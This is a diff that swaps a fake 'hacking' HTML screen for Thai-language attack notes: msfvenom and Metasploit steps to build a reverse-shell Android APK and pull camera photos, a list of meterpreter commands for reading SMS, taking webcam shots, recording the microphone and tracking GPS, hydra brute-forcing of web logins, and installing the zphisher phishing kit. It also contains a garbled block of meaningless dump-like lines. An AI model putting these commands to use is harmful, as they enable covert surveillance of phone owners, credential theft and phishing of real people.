@@ -1,136 +1,96 @@
-<!DOCTYPE html>
-<html>
-<head>
-<meta charset="UTF-8">
-<title>Hack Screen</title>
+# kali linux
+# trap IP
 
-<style>
-body{
-  margin:0;
-  background:black;
-  overflow:hidden;
-  font-family:monospace;
-}
+Sudo su 
 
-/* ตัวเลขวิ่ง */
-canvas{
-  position:absolute;
-  top:0;
-  left:0;
-}
+git clone https://github.com/techchipnet/hound 
 
-/* SLUR */
-.title{
-  position:absolute;
-  width:100%;
-  text-align:center;
-  top:25%;
-  font-size:120px;
-  font-weight:bold;
-  color:#000;
-  text-shadow:
-    0 0 10px red,
-    0 0 40px red,
-    0 0 80px red;
-  z-index:2;
-}
+cd hound 
 
-/* โหลดบาร์ */
-.barBox{
-  position:absolute;
-  bottom:80px;
-  width:100%;
-  text-align:center;
-  z-index:2;
-}
+bash hound.sh
 
-.bar{
-  width:60%;
-  height:35px;
-  margin:auto;
-  border:2px solid #ff0000;
-  box-shadow:0 0 15px #ff0000;
-  position:relative;
-}
+# App virus Android
 
-.fill{
-  height:100%;
-  width:0%;
-  background:#00ff00;
-  box-shadow:0 0 20px #ff0000;
-}
+sudo su
 
-.text{
-  position:absolute;
-  width:100%;
-  top:6px;
-  color:#00ff00;
-  font-weight:bold;
-}
-</style>
-</head>
-<body>
+msfvenom -p android/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -o evil.apk
 
-<canvas id="matrix"></canvas>
+msfconsole
 
-<div class="title">SLUR</div>
+use exploit/multi/handler
 
-<div class="barBox">
-  <div class="bar">
-    <div class="fill" id="load"></div>
-    <div class="text">ACCESSING SYSTEM...</div>
-  </div>
-</div>
+set payload android/meterpreter/reverse_tcp
 
-<script>
-/* MATRIX EFFECT */
-let c = document.getElementById("matrix");
-let ctx = c.getContext("2d");
+set LHOST YOUR_IP
 
-c.height = window.innerHeight;
-c.width = window.innerWidth;
+set LPORT 4444
 
-let letters = "01";
-letters = letters.split("");
+exploit
 
-let fontSize = 14;
-let columns = c.width/fontSize;
+cd /storage/emulated/0/DCIM/Camera
 
-let drops = [];
-for(let x=0;x<columns;x++)
-  drops[x]=1;
+ls
 
-function draw(){
-  ctx.fillStyle="rgba(0,0,0,0.05)";
-  ctx.fillRect(0,0,c.width,c.height);
+download YourPngName.png
 
-  ctx.fillStyle="rgb(255, 0, 0)";
-  ctx.font=fontSize+"px monospace";
-
-  for(let i=0;i<drops.length;i++){
-    let text = letters[Math.floor(Math.random()*letters.length)];
-    ctx.fillText(text,i*fontSize,drops[i]*fontSize);
-
-    if(drops[i]*fontSize>c.height && Math.random()>0.975)
-      drops[i]=0;
-
-    drops[i]++;
-  }
-}
-setInterval(draw,33);
+คำสั่งพื้นฐาน
+1. vibrate สั่นเครื่อง
+2. screenshot แคปหน้าจอ
+3. dump_sms ดูข้อมูล sms
+4. send_sms -d เบอร์ -t ข้อความ    ส่งข้อความ sms
+5. webcam_snap ถ่ายภาพ
+6. download * เพื่อโหลดไฟล์ทั้งหมด
+7. geolocate ดึงตำแหน่ง gps
+8. app_list แสดงรายชื่อแอพทั้งหมด
+9.app_run com.ชื่อแอพ  รันแอพ
+10.record_mic -d 10   อัดเสียงไมโครโฟน 10 วิ
+11.shell เข้าสู่ android shell สามารถป้อนคำสั่งต่างๆได้อิสระ ลบ system,ลบ แอพ,ลบภาพ,ตั้งรหัส,อื่นๆ
 
 
-/* LOAD BAR */
-let bar=document.getElementById("load");
-let w=0;
-let loading=setInterval(()=>{
-  if(w>=100) clearInterval(loading);
-  else{
-    w++;
-    bar.style.width=w+"%";
-  }
-},60);
-</script>
 
-</body>
-</html>
+//: DDmc di 00001855438 lub OoO 59d8.acc:  *00007ff742457b95 / 0x0107b95: 00 != 4e
+
+//: DDmc di 0000240u604 lud OoO 59d8.acc:  *00007ff742350000-00007ff742350fff 0x0002/0x0080 0x1000000
+
+//: DDmc di 0000143g294 lud OoO 59d8.acc:  *000000007ffe9000-000000007ffe9fff 0x0002/0x0002 0x0020000
+
+//: DDmc di 0000
+
+
+
+
+# hydra
+
+คำสั่ง
+
+sudo apt install gobuster -y
+
+sudo apt install seclists -y
+
+sudo apt install hydra -y
+
+gobuster dir -u ลิ้งเว็บ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php -t 50
+
+hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-500.txt http-post-form://ลิ้งหน้าล็อกอิน:"username=^USER^&password=^PASS^":"F=Invalid"
+
+
+# Phishing
+
+sudo su
+git clone --depth=1 https://github.com/htr-tech/zphisher.git
+
+$ cd zphisher
+$ bash zphisher.sh
+
+$ pkg install tur-repo
+$ pkg install zphisher
+$ zphisher
+
+Dockerfile
+
+FROM alpine:latest
+LABEL MAINTAINER="https://github.com/htr-tech/zphisher"
+WORKDIR /zphisher/
+ADD . /zphisher
+RUN apk add --no-cache bash ncurses curl unzip wget php 
+CMD "./zphisher.sh"
